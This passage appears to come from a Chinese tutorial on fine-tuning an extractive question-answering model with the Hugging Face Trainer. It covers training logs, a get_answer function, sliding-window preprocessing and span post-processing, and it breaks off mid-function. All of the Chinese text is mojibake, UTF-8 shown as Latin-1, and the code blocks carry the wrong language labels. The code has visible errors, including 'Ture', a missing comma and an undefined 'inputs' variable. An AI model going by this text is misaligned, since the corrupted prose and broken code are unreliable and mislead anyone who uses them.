<li>Batch Size = 1 ï¼šå­¦ç”Ÿåšå®Œä¸€é¢˜ï¼Œè€å¸ˆé©¬ä¸Šæ‰¹æ”¹ä¸€é¢˜ã€‚å­¦ç”Ÿèƒ½ç«‹åˆ»å¾—åˆ°åé¦ˆï¼Œä½†è€å¸ˆä¼šå¾ˆç´¯ï¼ˆè®¡ç®—æ…¢ï¼‰ï¼Œè€Œä¸”å¦‚æœæŸé“é¢˜å‡ºé”™äº†ï¼ˆè„æ•°æ®ï¼‰ï¼Œå­¦ç”Ÿä¼šè¢«å¸¦åã€‚</li>
<li>Batch Size = 100 ï¼šå­¦ç”Ÿåšå®Œ100é¢˜ï¼Œè€å¸ˆç»Ÿä¸€æ‰¹æ”¹ï¼Œå‘Šè¯‰ä»–â€œæ€»ä½“æ–¹å‘å¯¹äº†æ²¡æœ‰â€ã€‚è¿™æ ·æ¯”è¾ƒç¨³ï¼ˆæ¢¯åº¦ç¨³å®šï¼‰ï¼Œä½†å¯¹è€å¸ˆçš„è„‘å®¹é‡ï¼ˆæ˜¾å­˜ï¼‰è¦æ±‚å¾ˆé«˜ã€‚</li>
</ul>
<p><strong>æƒé‡è¡°å‡ weight_decay: é€šä¿—æ¥è¯´ ï¼Œç»™â€œæ­»è®°ç¡¬èƒŒâ€çš„å­¦ç”Ÿæ‰£åˆ†ï¼ˆæƒ©ç½šé¡¹ï¼‰ã€‚</strong></p>
<p>å®ƒå¼ºåˆ¶æ¨¡å‹ä¸è¦è¿‡äºä¾èµ–æŸå‡ ä¸ªç‰¹å®šçš„ç‰¹å¾ï¼ˆæ¯”å¦‚ä¸è¦çœ‹åˆ°â€œå› ä¸ºâ€ä¸¤ä¸ªå­—å°±æ— è„‘é€‰åé¢çš„å¥å­åšç­”æ¡ˆï¼‰ã€‚å®ƒè®©æ¨¡å‹çš„å‚æ•°å°½é‡å°ä¸”åˆ†æ•£ï¼Œè¿™æ ·æ¨¡å‹çš„æ³›åŒ–èƒ½åŠ›æ›´å¼ºã€‚</p>
<p>å¦‚æœæ¨¡å‹è¿‡æ‹Ÿåˆäº†ï¼Œå¯ä»¥é€‚å½“è°ƒå¤§Â <strong><code>weight_decay</code></strong>* <em>ã€‚</em>*</p>
<p>æœ€åï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡<code>Trainer</code>ï¼Œå¯¹æ¨¡å‹è¿›è¡Œè®­ç»ƒå•¦ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">...  
  
Â  Â Â <span class="hljs-comment"># å®ä¾‹åŒ– Trainer  </span>
Â  Â  <span class="hljs-attr">data_collator</span> = DefaultDataCollator()  
Â  Â  <span class="hljs-attr">trainer</span> = Trainer(  
Â  Â  Â  Â  <span class="hljs-attr">model</span>=model,  
Â  Â  Â  Â  <span class="hljs-attr">args</span>=args,  
Â  Â  Â  Â  <span class="hljs-attr">train_dataset</span>=tokenized_datasets[<span class="hljs-string">"train"</span>],  
Â  Â  Â  Â  <span class="hljs-attr">eval_dataset</span>=tokenized_datasets[<span class="hljs-string">"validation"</span>],  
Â  Â  Â  Â  <span class="hljs-attr">tokenizer</span>=tokenizer,  
Â  Â  Â  Â  <span class="hljs-attr">data_collator</span>=data_collator,  
Â  Â  )  
  
Â  Â Â <span class="hljs-comment"># å¼€å§‹è®­ç»ƒ  </span>
Â  Â  trainer.train()
</code></pre>
<p>åœ¨æ¨¡å‹è®­ç»ƒè¿‡ç¨‹ä¸­ï¼Œç»ˆç«¯ä¼šè¾“å‡ºä¸€äº›è®­ç»ƒæ—¶å‚æ•°</p>
<pre><code class="hljs language-arduino" lang="arduino">{<span class="hljs-string">'loss'</span>: <span class="hljs-number">3.9616</span>, <span class="hljs-string">'grad_norm'</span>: <span class="hljs-number">17.661741256713867</span>, <span class="hljs-string">'learning_rate'</span>: <span class="hljs-number">4.7e-05</span>, <span class="hljs-string">'epoch'</span>: <span class="hljs-number">3.33</span>} Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â Â   
{<span class="hljs-string">'loss'</span>: <span class="hljs-number">2.0221</span>, <span class="hljs-string">'grad_norm'</span>: <span class="hljs-number">26.38640594482422</span>, <span class="hljs-string">'learning_rate'</span>: <span class="hljs-number">4.3666666666666666e-05</span>, <span class="hljs-string">'epoch'</span>: <span class="hljs-number">6.67</span>} Â  Â  Â  Â  Â Â   
{<span class="hljs-string">'loss'</span>: <span class="hljs-number">1.7888</span>, <span class="hljs-string">'grad_norm'</span>: <span class="hljs-number">30.200885772705078</span>, <span class="hljs-string">'learning_rate'</span>: <span class="hljs-number">4.0333333333333336e-05</span>, <span class="hljs-string">'epoch'</span>: <span class="hljs-number">10.0</span>} Â  Â  Â  Â  Â   
{<span class="hljs-string">'loss'</span>: <span class="hljs-number">1.2302</span>, <span class="hljs-string">'grad_norm'</span>: <span class="hljs-number">46.9060173034668</span>, <span class="hljs-string">'learning_rate'</span>: <span class="hljs-number">3.7e-05</span>, <span class="hljs-string">'epoch'</span>: <span class="hljs-number">13.33</span>} Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  Â   
{<span class="hljs-string">'loss'</span>: <span class="hljs-number">0.5915</span>, <span class="hljs-string">'grad_norm'</span>: <span class="hljs-number">51.04061508178711</span>, <span class="hljs-string">'learning_rate'</span>: <span class="hljs-number">3.366666666666667e-05</span>, <span class="hljs-string">'epoch'</span>: <span class="hljs-number">16.67</span>} Â  Â  Â  Â  Â Â   
{<span class="hljs-string">'loss'</span>: <span class="hljs-number">0.3984</span>, <span class="hljs-string">'grad_norm'</span>: <span class="hljs-number">0.5519830584526062</span>, <span class="hljs-string">'learning_rate'</span>: <span class="hljs-number">3.0333333333333337e-05</span>, <span class="hljs-string">'epoch'</span>: <span class="hljs-number">20.0</span>} Â  Â  Â  Â  Â   
{<span class="hljs-string">'loss'</span>: <span class="hljs-number">0.5358</span>, <span class="hljs-string">'grad_norm'</span>: <span class="hljs-number">16.61482810974121</span>, <span class="hljs-string">'learning_rate'</span>: <span class="hljs-number">2.7000000000000002e-05</span>, <span class="hljs-string">'epoch'</span>: <span class="hljs-number">23.33</span>} Â  Â  Â  Â  Â   
{<span class="hljs-string">'loss'</span>: <span class="hljs-number">0.0591</span>, <span class="hljs-string">'grad_norm'</span>: <span class="hljs-number">20.124296188354492</span>, <span class="hljs-string">'learning_rate'</span>: <span class="hljs-number">2.3666666666666668e-05</span>, <span class="hljs-string">'epoch'</span>: <span class="hljs-number">26.67</span>} Â  Â  Â  Â Â   
{<span class="hljs-string">'loss'</span>: <span class="hljs-number">0.009</span>, <span class="hljs-string">'grad_norm'</span>: <span class="hljs-number">0.022040903568267822</span>, <span class="hljs-string">'learning_rate'</span>: <span class="hljs-number">2.0333333333333334e-05</span>, <span class="hljs-string">'epoch'</span>: <span class="hljs-number">30.0</span>} Â  Â  Â  Â Â   
{<span class="hljs-string">'loss'</span>: <span class="hljs-number">0.0018</span>, <span class="hljs-string">'grad_norm'</span>: <span class="hljs-number">0.025523267686367035</span>, <span class="hljs-string">'learning_rate'</span>: <span class="hljs-number">1.7000000000000003e-05</span>, <span class="hljs-string">'epoch'</span>: <span class="hljs-number">33.33</span>} Â  Â  Â Â   
{<span class="hljs-string">'loss'</span>: <span class="hljs-number">0.0054</span>, <span class="hljs-string">'grad_norm'</span>: <span class="hljs-number">0.21060892939567566</span>, <span class="hljs-string">'learning_rate'</span>: <span class="hljs-number">1.3666666666666666e-05</span>, <span class="hljs-string">'epoch'</span>: <span class="hljs-number">36.67</span>} Â  Â  Â  Â   
{<span class="hljs-string">'loss'</span>: <span class="hljs-number">0.0004</span>, <span class="hljs-string">'grad_norm'</span>: <span class="hljs-number">0.01707434467971325</span>, <span class="hljs-string">'learning_rate'</span>: <span class="hljs-number">1.0333333333333333e-05</span>, <span class="hljs-string">'epoch'</span>: <span class="hljs-number">40.0</span>}
</code></pre>
<p><code>loss</code>è¡¨ç¤ºæ¨¡å‹çš„é¢„æµ‹ä¸çœŸå®ç­”æ¡ˆä¹‹é—´çš„å·®è·ã€‚è¿™ä¸ªå·®è·å€¼ï¼Œå°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„â€œæŸå¤±å€¼â€ã€‚åœ¨è®­ç»ƒè¿‡ç¨‹ä¸­æˆ‘ä»¬å¯ä»¥å‘ç°Â <code>loss</code>é€æ¸å‡å°‘ï¼Œè¿™è¯æ˜æ¨¡å‹åœ¨è®­ç»ƒè¿‡ç¨‹ä¸­çš„æ•ˆæœè¶Šæ¥è¶Šç¬¦åˆéªŒè¯é›†ä¸­çš„æ•°æ®ã€‚</p>
<blockquote>
<p><strong>ä¸ºä»€ä¹ˆè¿™é‡Œçš„</strong>* *<code>epoch</code>**<strong>æ˜¯å°æ•°ï¼Ÿ</strong></p>
<p>åœ¨ä¸Šè¿°ä¾‹å­ä¸­ï¼š</p>
<ul>
<li>æ•°æ®æ€»é‡ ï¼šåªæœ‰ 5 æ¡æ•°æ®ã€‚</li>
<li>æ‰¹æ¬¡å¤§å° ( per_device_train_batch_size ) ï¼šè®¾ä¸º 2 ã€‚</li>
</ul>
<p>é‚£ä¹ˆï¼Œå®Œæˆ 1 ä¸ª Epoch ï¼ˆéå†æ‰€æœ‰æ•°æ®ä¸€éï¼‰éœ€è¦èµ°å‡ æ­¥ï¼ˆStepsï¼‰ï¼Ÿ</p>
<p>(æ³¨ï¼šç¬¬1æ­¥å–2æ¡ï¼Œç¬¬2æ­¥å–2æ¡ï¼Œç¬¬3æ­¥å–æœ€å1æ¡)</p>
<p>è®¾ç½®äº†Â <code>logging_steps</code>=10 ã€‚</p>
<p>è¿™æ„å‘³ç€ Trainer æ¯èµ° 10 æ­¥ ï¼ˆStepsï¼‰å°±ä¼šæ‰“å°ä¸€æ¬¡æ—¥å¿—ã€‚</p>
<p>æˆ‘ä»¬æ¥ç®—ç®— 10 æ­¥ ç›¸å½“äºè·‘äº†å¤šå°‘ä¸ª Epochï¼š</p>
<p>æ‰€ä»¥ï¼š</p>
<ul>
<li>ç¬¬ 10 æ­¥æ—¶ï¼Œæ‰“å°æ—¥å¿—ï¼Œæ­¤æ—¶ Epoch = 10 / 3 â‰ˆ 3.33</li>
<li>ç¬¬ 20 æ­¥æ—¶ï¼Œæ‰“å°æ—¥å¿—ï¼Œæ­¤æ—¶ Epoch = 20 / 3 â‰ˆ 6.67</li>
<li>ç¬¬ 30 æ­¥æ—¶ï¼Œæ‰“å°æ—¥å¿—ï¼Œæ­¤æ—¶ Epoch = 30 / 3 = 10.0</li>
</ul>
<p>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆä½ ä¼šçœ‹åˆ° 3.33 , 6.67 è¿™ç§éæ•´æ•°çš„ Epochã€‚</p>
</blockquote>
<h4 data-id="heading-10">æ•ˆæœéªŒè¯å’Œæ€»ç»“</h4>
<p>æˆ‘ä»¬ä»¥æœ¬èŠ‚å¼€å¤´çš„ä¾‹å­æ¥éªŒè¯ä¸€ä¸‹ï¼Œé‚£ä¹ˆå¦‚ä½•å»éªŒè¯å‘¢ï¼Ÿ</p>
<pre><code class="hljs language-scss" lang="scss">test_context = raw_datasets<span class="hljs-selector-attr">[<span class="hljs-string">"train"</span>]</span><span class="hljs-selector-attr">[1]</span><span class="hljs-selector-attr">[<span class="hljs-string">"context"</span>]</span>  
test_question = raw_datasets<span class="hljs-selector-attr">[<span class="hljs-string">"train"</span>]</span><span class="hljs-selector-attr">[1]</span><span class="hljs-selector-attr">[<span class="hljs-string">"question"</span>]</span>  
  
answer = <span class="hljs-built_in">get_answer</span>(test_question, test_context, model, tokenizer)  
<span class="hljs-built_in">print</span>(f"é—®é¢˜:Â {test_question}")  
<span class="hljs-built_in">print</span>(f"å›ç­”:Â {answer}")
</code></pre>
<p>åœ¨Â <code>get_answer</code>å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬éœ€è¦è¿›è¡ŒÂ <strong><code>tokenizer</code></strong> ã€<code>modelcå¤„ç†</code> <strong>ä»¥åŠ</strong> <code>åå¤„ç†</code>ä¸‰æ­¥éª¤ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">defÂ get_answer(question, context, model, tokenizer):  
Â  Â Â <span class="hljs-comment"># å°†æ¨¡å‹è®¾ä¸ºè¯„ä¼°æ¨¡å¼  </span>
Â  Â  model.eval()  
  
Â  Â Â <span class="hljs-comment"># 1. åˆ†è¯  </span>
Â  Â  <span class="hljs-attr">inputs</span> = tokenizer(question, context, return_tensors=<span class="hljs-string">"pt"</span>)  
  
Â  Â Â <span class="hljs-comment"># 2. æ¨¡å‹å‰å‘ä¼ æ’­  </span>
Â  Â Â withÂ torch.no_grad():  
Â  Â  Â  Â  <span class="hljs-attr">outputs</span> = model(**inputs)  
  
Â  Â Â <span class="hljs-comment"># 3. åå¤„ç†ï¼šè·å–é¢„æµ‹ç»“æœ  </span>
Â  Â Â <span class="hljs-comment"># æ¨¡å‹è¾“å‡ºåŒ…å« start_logits å’Œ end_logitsï¼Œåˆ†åˆ«è¡¨ç¤ºæ¯ä¸ª Token æ˜¯ç­”æ¡ˆå¼€å¤´çš„æ¦‚ç‡å’Œç»“å°¾çš„æ¦‚ç‡  </span>
Â  Â  <span class="hljs-attr">answer_start_index</span> = torch.argmax(outputs.start_logits)  
Â  Â  <span class="hljs-attr">answer_end_index</span> = torch.argmax(outputs.end_logits) +Â <span class="hljs-number">1</span>Â Â <span class="hljs-comment"># +1 æ˜¯å› ä¸ºåˆ‡ç‰‡æ˜¯å·¦é—­å³å¼€  </span>
  
Â  Â Â <span class="hljs-comment"># 4. å°† Token ID è½¬æ¢å›æ–‡æœ¬  </span>
Â  Â  <span class="hljs-attr">predict_answer_tokens</span> = inputs.input_ids[<span class="hljs-number">0</span>, answer_start_index:answer_end_index]  
Â  Â  <span class="hljs-attr">predicted_answer</span> = tokenizer.decode(predict_answer_tokens, skip_special_tokens=<span class="hljs-literal">True</span>)  
  
Â  Â Â returnÂ predicted_answer
</code></pre>
<p>è¦æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œæ¨¡å‹è¾“å‡ºçš„æ˜¯<code>start_logits</code>å’Œ<code>end_logits</code>ï¼Œåˆ†åˆ«è¡¨ç¤ºæ¯ä¸ª Token æ˜¯ç­”æ¡ˆå¼€å¤´çš„æ¦‚ç‡å’Œç»“å°¾çš„"æ¦‚ç‡"ï¼ˆå¯¹æ•°å‡ ç‡ï¼‰</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c2e91a3661954db88f46d6c70e4a9a7c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQUnlpKfmqKHlnos=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767595861&amp;x-signature=8cGMrExMRAZDRiQ9vAOEEUvTErM%3D" alt="" loading="lazy"/></p>
<p>åœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ç›´æ¥é€šè¿‡Â <code>torch.argmax</code>åˆ†åˆ«è·å–ä¸¤è€…æ¦‚ç‡æœ€å¤§çš„ç´¢å¼•ï¼Œæœ€ååœ¨Â <code>Input ids</code>ä¸­å»è·å–ç›¸å¯¹åº”çš„Â <code>Token</code>ï¼Œæœ€åå†ç”±Â <code>tokenizer</code>è§£ç æˆæ–‡æœ¬å†…å®¹ã€‚</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># é—®é¢˜: ACC æœ‰å“ªäº›åŠŸèƒ½  </span>
<span class="hljs-comment"># å›ç­”: æƒ é™ é… ç½® ã€ æƒ é™ ä¸‹ å‘ åŠ é‰´ æƒ åŠŸ èƒ½</span>
</code></pre>
<p>æœ€åçœ‹ä¸Šå»æ•ˆæœè¿˜ä¸é”™ï¼Œè¿™æ¬¡æ¬¡æ¨¡å‹å¾®è°ƒå°±ç»“æŸå•¦ï½</p>
<h4 data-id="heading-11">æ‹“å±•å†…å®¹</h4>
<p><strong>æ³¨æ„</strong></p>
<p>æœ¬æ¬¡å¾®è°ƒåªæ˜¯ä¸€ä¸ªâ€œç©å…·â€æµç¨‹ï¼Œæœ‰ä¸€äº›éœ€è¦æ³¨æ„çš„åœ°æ–¹ï¼š</p>
<ul>
<li>æ­£å¸¸è®­ç»ƒæ—¶çš„æ•°æ®é›†ä¸å¯èƒ½è¿™ä¹ˆå°‘ï¼ŒåŠ¨åˆ™ä¸Šä¸‡æ¡æ–‡æœ¬æ•°æ®çš„æ•°æ®é›†åªæ˜¯é—¨æ§›ã€‚ã€‚</li>
<li>ç”±äºè®­ç»ƒé›†å°ï¼Œå› æ­¤æˆ‘ä»¬çš„<code>epoch</code>è®¾ç½®äº†50è½®ï¼Œè®©æ¨¡å‹è¿‡æ‹Ÿåˆæ¥æ›´å¥½çš„å»éªŒè¯ç»“æœã€‚æ­£å¸¸æ¨¡å‹è®­ç»ƒæ—¶ä¸€èˆ¬å–3è½®å·¦å³ã€‚</li>
</ul>
<p><strong>æ‹“å±•å†…å®¹</strong></p>
<h5 data-id="heading-12"><strong>é¢„å¤„ç†è®­ç»ƒé›†ï¼ˆæ»‘åŠ¨çª—å£ï¼‰</strong></h5>
<p>åœ¨é¢„å¤„ç†è®­ç»ƒé›†è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬é‡‡ç”¨ç®€å•æˆªæ–­çš„æ–¹å¼ï¼šæˆ‘å‡è®¾ä½ çš„æ–‡æœ¬å¾ˆçŸ­ï¼Œæˆ–è€…ç­”æ¡ˆä¸€å®šåœ¨å‰ 384 ä¸ª Token é‡Œã€‚å¦‚æœæ–‡ç« å¾ˆé•¿ï¼Œè¶…å‡ºéƒ¨åˆ†ç›´æ¥æ‰”æ‰ (Â <code>truncation="only_second"</code>)ã€‚å¦‚æœç­”æ¡ˆä¸å¹¸åœ¨è¢«æ‰”æ‰çš„é‚£éƒ¨åˆ†é‡Œï¼Œæ¨¡å‹å°±æ°¸è¿œæ‰¾ä¸åˆ°äº†ã€‚</p>
<p>å› æ­¤æ¨¡å‹ä¸éœ€è¦å¤„ç†â€œä¸€ä¸ªæ ·æœ¬å˜æˆå¤šä¸ªç‰‡æ®µâ€çš„æƒ…å†µï¼Œä»£ç é€»è¾‘æ˜¯ä¸€å¯¹ä¸€çš„ï¼Œéå¸¸ç®€å•ã€‚</p>
<p>å¦‚æœè®­ç»ƒé›†ä¸­çš„æ–‡æœ¬å†…å®¹å¾ˆé•¿ï¼Œæˆ‘ä»¬å¯ä»¥ç»™Â <code>tokenizer</code>è®¾ç½®Â <code>stride</code>ï¼ˆæ­¥é•¿ï¼‰ï¼Œè¡¨ç¤ºå°†æ–‡ç« åˆ†å‰²ä¸ºè‹¥å¹²ä¸ªåˆ‡ç‰‡ï¼Œæ¯ä¸€ä¸ªåˆ‡ç‰‡éƒ½æœ‰é‡åˆçš„ä¸€éƒ¨åˆ†ã€‚è¿™å°±å¯¼è‡´äº†â€œ ä¸€å¯¹å¤š â€çš„å…³ç³»ï¼ˆ1 ä¸ªé—®é¢˜ -&gt; N ä¸ªè¾“å…¥ç‰‡æ®µï¼‰ã€‚åœ¨é¢„æµ‹æ—¶ï¼Œåˆ™éœ€è¦æ”¶é›†è¿™ N ä¸ªç‰‡æ®µçš„æ‰€æœ‰è¾“å‡ºÂ <code>Logits</code>ï¼Œç»Ÿä¸€æ¯”è¾ƒï¼Œæ‰¾å‡ºåœ¨è¿™ä¸ªé•¿æ–‡ç« ä¸­åˆ°åº•å“ªä¸€æ®µçš„å“ªä¸ªä½ç½®åˆ†æ•°æœ€é«˜ã€‚</p>
<pre><code class="hljs language-ini" lang="ini">defÂ preprocess_function(examples, tokenizer):  
Â  Â   
Â  Â  <span class="hljs-attr">tokenized_inputs</span> = tokenizer(  
Â  Â  Â  Â  examples<span class="hljs-section">["question"]</span>,  
Â  Â  Â  Â  examples<span class="hljs-section">["context"]</span>,  
Â  Â  Â  Â  <span class="hljs-attr">max_length</span>=<span class="hljs-number">384</span>,  
Â  Â  Â  Â  <span class="hljs-attr">truncation</span>=<span class="hljs-string">"only_second"</span>,  
Â  Â  Â  Â  <span class="hljs-attr">return_offsets_mapping</span>=<span class="hljs-literal">True</span>,  
Â  Â  Â  Â  <span class="hljs-attr">return_overflowing_tokens</span>=Ture  
Â  Â  Â  Â  <span class="hljs-attr">stride</span>=<span class="hljs-number">100</span>,  
Â  Â  Â  Â  <span class="hljs-attr">padding</span>=<span class="hljs-string">"max_length"</span>,  
Â  Â  )  
Â  Â Â   
Â  Â Â <span class="hljs-comment"># 2. å¤„ç†ç­”æ¡ˆä½ç½®  </span>
Â  Â  <span class="hljs-attr">offset_mapping</span> = tokenized_inputs.pop(<span class="hljs-string">"offset_mapping"</span>)  
Â  Â  <span class="hljs-attr">answers</span> = examples[<span class="hljs-string">"answers"</span>]  
Â  Â  <span class="hljs-attr">start_positions</span> = []  
Â  Â  <span class="hljs-attr">end_positions</span> = []  
Â  Â  <span class="hljs-attr">sample_idxs</span> = []  
  
Â  Â Â forÂ i, offsetÂ inÂ enumerate(offset_mapping):  
Â  Â  Â  Â Â <span class="hljs-comment"># è¡¨ç¤ºå½“å‰ç‰‡æ®µæ‰€å¯¹åº”çš„æ ·æœ¬ç´¢å¼•  </span>
Â  Â  Â  Â  <span class="hljs-attr">sample_idx</span> = inputs[<span class="hljs-string">"overflow_to_sample_mapping"</span>][i]  
Â  Â  Â  Â  sample_idxs.append(sample_idx)  
Â  Â  Â  Â  <span class="hljs-attr">answer</span> = answers[sample_idx]  
Â  Â  Â  Â  <span class="hljs-attr">start_char</span> = answer[<span class="hljs-string">"answer_start"</span>][<span class="hljs-number">0</span>]  
Â  Â  Â  Â  <span class="hljs-attr">end_char</span> = start_char + len(answer[<span class="hljs-string">"text"</span>][<span class="hljs-number">0</span>])  
  
Â  Â  Â  Â Â <span class="hljs-comment"># sequence_ids ç”¨äºåŒºåˆ†å“ªéƒ¨åˆ†æ˜¯é—®é¢˜ï¼Œå“ªéƒ¨åˆ†æ˜¯ä¸Šä¸‹æ–‡  </span>
Â  Â  Â  Â Â <span class="hljs-comment"># 0 ä»£è¡¨é—®é¢˜ï¼Œ1 ä»£è¡¨ä¸Šä¸‹æ–‡ï¼ŒNone ä»£è¡¨ç‰¹æ®Šç¬¦å·([CLS], [SEP], [PAD])  </span>
Â  Â  Â  Â  <span class="hljs-attr">sequence_ids</span> = tokenized_inputs.sequence_ids(i)  
  
Â  Â  Â  Â Â <span class="hljs-comment"># æ‰¾åˆ°ä¸Šä¸‹æ–‡åœ¨ Token åºåˆ—ä¸­çš„èµ·å§‹å’Œç»“æŸç´¢å¼•  </span>
Â  Â  Â  Â  <span class="hljs-attr">idx</span> =Â <span class="hljs-number">0</span>  
Â  Â  Â  Â Â whileÂ sequence_ids<span class="hljs-section">[idx]</span> !=Â 1:  
Â  Â  Â  Â  Â  Â  idx +=Â 1  
Â  Â  Â  Â  <span class="hljs-attr">context_start</span> = idx  
Â  Â  Â  Â Â whileÂ sequence_ids<span class="hljs-section">[idx]</span> ==Â 1:  
Â  Â  Â  Â  Â  Â  idx +=Â 1  
Â  Â  Â  Â  <span class="hljs-attr">context_end</span> = idx -Â <span class="hljs-number">1</span>  
  
Â  Â  Â  Â Â <span class="hljs-comment"># å¦‚æœç­”æ¡ˆä¸åœ¨å½“å‰æˆªæ–­çš„ç‰‡æ®µä¸­ï¼ˆé’ˆå¯¹è¶…é•¿æ–‡æœ¬ï¼‰ï¼Œè¿™å°±æ ‡è®°ä¸º (0, 0)  </span>
Â  Â  Â  Â Â <span class="hljs-comment"># è¿™é‡Œçš„ offset[context_end][1] æ˜¯å½“å‰ç‰‡æ®µæœ€åä¸€ä¸ª Token å¯¹åº”çš„åŸæ–‡ç»“æŸå­—ç¬¦ä½ç½®  </span>
Â  Â  Â  Â Â ifÂ offset<span class="hljs-section">[context_start]</span><span class="hljs-section">[0]</span> &gt; start_charÂ orÂ offset<span class="hljs-section">[context_end]</span><span class="hljs-section">[1]</span> &lt; end_char:  
Â  Â  Â  Â  Â  Â  start_positions.append(0)  
Â  Â  Â  Â  Â  Â  end_positions.append(0)  
Â  Â  Â  Â Â else:  
Â  Â  Â  Â  Â  Â Â <span class="hljs-comment"># å¦åˆ™ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ° Token çš„ start_index å’Œ end_index  </span>
  
Â  Â  Â  Â  Â  Â Â <span class="hljs-comment"># ä»ä¸Šä¸‹æ–‡çš„ç¬¬ä¸€ä¸ª Token å¼€å§‹å¾€åæ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°åŒ…å« start_char çš„ Token  </span>
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">idx</span> = context_start  
Â  Â  Â  Â  Â  Â Â whileÂ idx &lt;= context_endÂ andÂ offset<span class="hljs-section">[idx]</span><span class="hljs-section">[0]</span> &lt;= start_char:  
Â  Â  Â  Â  Â  Â  Â  Â  idx +=Â 1  
Â  Â  Â  Â  Â  Â  start_positions.append(idx -Â 1)  
  
Â  Â  Â  Â  Â  Â Â <span class="hljs-comment"># ä»ä¸Šä¸‹æ–‡çš„æœ€åä¸€ä¸ª Token å¼€å§‹å¾€å‰æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°åŒ…å« end_char çš„ Token  </span>
Â  Â  Â  Â  Â  Â  <span class="hljs-attr">idx</span> = context_end  
Â  Â  Â  Â  Â  Â Â whileÂ idx &gt;= context_startÂ andÂ offset<span class="hljs-section">[idx]</span><span class="hljs-section">[1]</span> &gt;= end_char:  
Â  Â  Â  Â  Â  Â  Â  Â  idx <span class="hljs-attr">-</span>=Â <span class="hljs-number">1</span>  
Â  Â  Â  Â  Â  Â  end_positions.append(idx +Â 1)  
  
Â  Â Â <span class="hljs-comment"># å°†è®¡ç®—å¥½çš„ Token çº§åˆ«çš„èµ·å§‹å’Œç»“æŸä½ç½®æ”¾å…¥ inputs ä¸­  </span>
Â  Â  tokenized_inputs<span class="hljs-section">["start_positions"]</span> = start_positions  
Â  Â  tokenized_inputs<span class="hljs-section">["end_positions"]</span> = end_positions  
Â  Â  tokenized_inputs<span class="hljs-section">["sample_idxs"]</span> = sample_idxs  
  
Â  Â Â returnÂ tokenized_inputs
</code></pre>
<h5 data-id="heading-13">æ¨¡å‹åå¤„ç†</h5>
<p>åœ¨ä¸Šè¿°æ¡ˆä¾‹ä¸­ï¼Œæˆ‘ä»¬æ˜¯åŸºäºæœ€ç®€å•çš„â€œè´ªå¿ƒâ€ç­–ç•¥å»å®ç°çš„ã€‚æˆ‘ä»¬å‡è®¾åˆ†åˆ«è·å–ä½œä¸ºå¼€å¤´ã€ç»“å°¾æ—¶æ¦‚ç‡æœ€å¤§çš„<code>Token</code>ï¼Œä¸¤è€…ä¸­é—´æ‰€åŒ…å«çš„æ–‡æœ¬å°±æ˜¯æœ€ä½³ç­”æ¡ˆã€‚</p>
<p>è¿™æ ·çš„å¤„ç†æ–¹å¼ä¼šæœ‰å¾ˆå¤§çš„é—®é¢˜ï¼š</p>
<ol start="0">
<li><strong>é—®é¢˜1ï¼šå¼€å§‹ç´¢å¼•å¤§äºç»“æŸç´¢å¼•</strong></li>
</ol>
<ul>
<li><strong>ç°è±¡</strong>ï¼šå½“æ¨¡å‹é¢„æµ‹çš„å§‹ä½ç½®<code>(start_index)</code>å¤§äºç»“æŸä½ç½®<code>(end_index)</code>æ—¶ï¼Œåˆ‡ç‰‡<code>input_ids[0, start_index:end_index]</code>ä¼šè¿”å›ç©ºå¼ é‡ï¼Œå¯¼è‡´è§£ç åå¾—åˆ°ç©ºå­—ç¬¦ä¸²</li>
<li><strong>åŸå› </strong>ï¼šç‹¬ç«‹ä½¿ç”¨Â <code>argmax</code>é€‰æ‹©Â <code>start</code>å’Œ<code>end</code>ä½ç½®ï¼Œæœªè€ƒè™‘ä¸¤è€…çš„ä¾èµ–å…³ç³»ï¼ˆç­”æ¡ˆå¿…é¡»æ˜¯è¿ç»­ç‰‡æ®µï¼Œ<code>start &lt;= end</code>ï¼‰</li>
</ul>
<ol start="0">
<li><strong>é—®é¢˜2ï¼šç½®ä¿¡åº¦è¿‡ä½</strong></li>
</ol>
<ul>
<li><strong>ç°è±¡</strong>ï¼šå³ä½¿æ¨¡å‹å¯¹æ‰€æœ‰ä½ç½®çš„é¢„æµ‹ç½®ä¿¡åº¦éƒ½å¾ˆä½ï¼ˆå¦‚contextä¸­æ— ç›¸å…³ç­”æ¡ˆï¼‰ï¼Œä»£ç ä»ä¼šè¿”å›ä¸€ä¸ªç­”æ¡ˆ</li>
<li><strong>åŸå› </strong>ï¼šç›´æ¥ä½¿ç”¨ argmax å¼ºåˆ¶é€‰æ‹©ä¸€ä¸ªä½ç½®ï¼Œæœªè€ƒè™‘æ¨¡å‹çš„é¢„æµ‹ä¸ç¡®å®šæ€§</li>
<li><strong>è§£å†³æ–¹å¼ï¼šé€šè¿‡éå†æ¯ä¸€ä¸ª Tokenï¼Œå¯»æ‰¾å‡ºæ‰€æœ‰çš„å¼€å¤´å’Œç»“å°¾çš„ç»„åˆï¼Œå¹¶è®¡ç®—å…¶æ¦‚ç‡ï¼Œæ‰¾å‡ºæ¦‚ç‡æœ€å¤§çš„é‚£å¯¹ç»„åˆã€‚</strong></li>
</ul>

<pre><code class="hljs language-ini" lang="ini">defÂ get_answer(question, context, model, tokenizer):  
Â  Â Â <span class="hljs-comment"># å°†æ¨¡å‹è®¾ä¸ºè¯„ä¼°æ¨¡å¼  </span>
Â  Â  model.eval()  
  
Â  Â Â <span class="hljs-comment"># 1. åˆ†è¯  </span>
Â  Â  <span class="hljs-attr">inputs</span> = tokenizer(  
